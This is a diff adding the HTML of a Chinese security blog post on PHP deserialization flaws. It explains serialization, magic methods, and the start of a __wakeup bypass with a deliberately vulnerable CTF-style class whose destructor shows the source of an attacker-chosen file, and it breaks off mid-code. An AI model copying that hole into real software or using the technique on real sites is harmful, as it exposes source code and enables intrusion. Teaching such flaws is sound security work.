@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="@TOC PHP序列化是什么 serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串unserialize()   &#x2F;&#x2F;将字符串还原成一个对象  序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。 反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。 简单来说，就是涉及php中的serialize与unserialize两个函数。 通过序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化漏洞解析和研究">
+<meta property="og:url" content="https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="@TOC PHP序列化是什么 serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串unserialize()   &#x2F;&#x2F;将字符串还原成一个对象  序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。 反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。 简单来说，就是涉及php中的serialize与unserialize两个函数。 通过序">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200103135151309.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200103141055940.png">
+<meta property="article:published_time" content="2020-01-03T07:12:37.000Z">
+<meta property="article:modified_time" content="2020-05-08T07:43:29.488Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>php反序列化漏洞解析和研究</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/01/02/KNN%E7%AE%97%E6%B3%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&text=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&is_video=false&description=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php反序列化漏洞解析和研究&body=Check out this article: https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&title=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&name=php反序列化漏洞解析和研究&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/&t=php反序列化漏洞解析和研究" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP序列化是什么"><span class="toc-number">1.</span> <span class="toc-text">PHP序列化是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#铺垫知识"><span class="toc-number">1.1.</span> <span class="toc-text">铺垫知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例序列化"><span class="toc-number">1.1.1.</span> <span class="toc-text">示例序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列实例"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#魔术方法"><span class="toc-number">2.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#比较重要的方法"><span class="toc-number">2.1.</span> <span class="toc-text">比较重要的方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反序列化对象注入"><span class="toc-number">3.</span> <span class="toc-text">反序列化对象注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过-wakeup-方法"><span class="toc-number">3.1.</span> <span class="toc-text">绕过__wakeup()方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#POP链构造"><span class="toc-number">4.</span> <span class="toc-text">POP链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POP：面向属性编程"><span class="toc-number">4.1.</span> <span class="toc-text">POP：面向属性编程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基本概念"><span class="toc-number">4.2.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP链利用"><span class="toc-number">4.3.</span> <span class="toc-text">POP链利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#训练"><span class="toc-number">4.4.</span> <span class="toc-text">训练</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        php反序列化漏洞解析和研究
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-01-03T07:12:37.000Z" itemprop="datePublished">2020-01-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">漏洞复现和分析 代码审计</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+<p>@<a href="php反序列化漏洞解析和研究">TOC</a></p>
+<h1 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h1><blockquote>
+<p>serialize()     //将一个对象转换成一个字符串<br>unserialize()   //将字符串还原成一个对象</p>
+</blockquote>
+<p>序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。</p>
+<p>反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。</p>
+<p>简单来说，就是涉及php中的serialize与unserialize两个函数。</p>
+<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p>
+<h2 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h2><h3 id="示例序列化"><a href="#示例序列化" class="headerlink" title="示例序列化"></a>示例序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testclass</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">        <span class="keyword">public</span> $name = <span class="string">"baba"</span>;</span><br><span class="line">        <span class="keyword">public</span> $age = <span class="string">"18"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Info</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'输出'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = <span class="keyword">new</span> testclass();</span><br><span class="line">    $test-&gt;name = <span class="string">'zhaibaba'</span>;</span><br><span class="line">    $test -&gt;age =<span class="string">'18'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test-&gt;Info();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    $data = serialize($test);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"序列化\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出<br>输出zhaibaba 18</p>
+<p>序列化<br>O:9:”testclass”:3:{s:15:” testclass flag”;s:9:”flag{233}”;s:4:”name”;s:8:”zhaibaba”;s:3:”age”;s:2:”18”;}</p>
+<p><code>O:9:&quot;testclass&quot;</code> 代表Object(对象) 9个字符:testclass<br><code>:3</code>对象属性个数为3<br><code>{}</code>中为属性字符数：属性值<br><code>s:15:&quot; testclass flag&quot;</code>  为 string类型 private私有属性 会加类名  public 共有的 直接属性名 </p>
+<blockquote>
+<p> public权限就是正常的变量权限，一般声明的变量权限均为public<br>protected权限是私有权限，即只能在类内使用，子类可以继承这个变量<br>private权限也是私有权限，比protected权限更似有一些，只能在本类内使用，子类不能继承</p>
+</blockquote>
+<h3 id="反序列实例"><a href="#反序列实例" class="headerlink" title="反序列实例"></a>反序列实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$un = unserialize($data);</span><br><span class="line">   <span class="comment"># $un = unserialize('O:9:"testclass":2:&#123;s:4:"name";s:8:"zhaibaba";s:3:"age";s:2:"18";&#125;');</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"反序列化\n"</span>;</span><br><span class="line">   var_dump($un);</span><br></pre></td></tr></table></figure>
+<p>反序列化为一个对象了<br><img src="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><blockquote>
+<p>魔术方法：在php中以两个下划线字符（__）开头的方法，方法名都是PHP预先定义好的，之所以称为魔术方法<br>就是这些方法不需要显示的调用而是由某种特定的条件触发执行。</p>
+</blockquote>
+<p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">常见方法</span><br><span class="line">__constuct: 构建对象的时被调用</span><br><span class="line"></span><br><span class="line">__destruct: 明确销毁对象或脚本结束时被调用</span><br><span class="line"></span><br><span class="line">__wakeup: 当使用unserialize时被调用，可用于做些对象的初始化操作</span><br><span class="line"></span><br><span class="line">__sleep: 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line"></span><br><span class="line">__call: 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">__callStatic: 调用不可访问或不存在的静态方法时被调用</span><br><span class="line"></span><br><span class="line">__set: 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__get: 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__isset: 对不可访问或不存在的属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时被调用</span><br><span class="line"></span><br><span class="line">__unset: 对不可访问或不存在的属性进行<span class="keyword">unset</span>时被调用</span><br><span class="line"></span><br><span class="line">__invoke: 当以函数方式调用对象时被调用</span><br><span class="line"></span><br><span class="line">__toString: 当一个类被转换成字符串时被调用</span><br><span class="line"></span><br><span class="line">__clone: 进行对象<span class="keyword">clone</span>时被调用，用来调整对象的克隆行为</span><br><span class="line"></span><br><span class="line">__debuginfo: 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5<span class="number">.6</span>版本</span><br><span class="line"></span><br><span class="line">__set_state: 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值</span><br></pre></td></tr></table></figure>
+
+<h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><p><strong>__sleep()</strong></p>
+<blockquote>
+<p> serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
+</blockquote>
+<p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
+<p>__wakeup()</p>
+<blockquote>
+<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup<br>方法，预先准备对象需要的资源。</p>
+</blockquote>
+<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结果<br><img src="https://img-blog.csdnimg.cn/20200103135151309.png" alt="在这里插入图片描述"></p>
+<p><strong>__toString()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br><span class="line">例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，</span><br><span class="line">否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br></pre></td></tr></table></figure>
+<p>简单的说就是 把对象用字符串表示，就自动调用这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'zhaibaba'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString:'</span>. <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $me.<span class="string">'&lt;br&gt;'</span>;</span><br></pre></td></tr></table></figure>
+<p>结果<br><img src="https://img-blog.csdnimg.cn/20200103141055940.png" alt="在这里插入图片描述"></p>
+<h1 id="反序列化对象注入"><a href="#反序列化对象注入" class="headerlink" title="反序列化对象注入"></a>反序列化对象注入</h1><h2 id="绕过-wakeup-方法"><a href="#绕过-wakeup-方法" class="headerlink" title="绕过__wakeup()方法"></a>绕过__wakeup()方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">      <span 